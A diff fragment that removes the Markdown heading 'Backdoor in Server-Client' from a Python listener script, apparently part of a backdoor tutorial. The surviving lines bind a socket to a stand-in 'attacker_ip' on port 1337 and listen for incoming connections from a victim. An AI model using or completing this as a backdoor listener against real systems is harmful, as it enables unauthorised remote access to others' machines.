@@ -1,9 +1,3 @@
-<h2 align="center">Backdoor in Server-Client</h2>
-<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>
-
-- - - - - - - - - - - - - - - - - - - - - -
-> [listener.py](listener.py)
-```python
 ## use socket library
 import socket
 
@@ -23,4 +17,3 @@ listener.bind(("attacker_ip", 1337))
 ## listen to any incoming communication (server side)
 ## use the same object created and call the listen method
 listener.listen()
-```
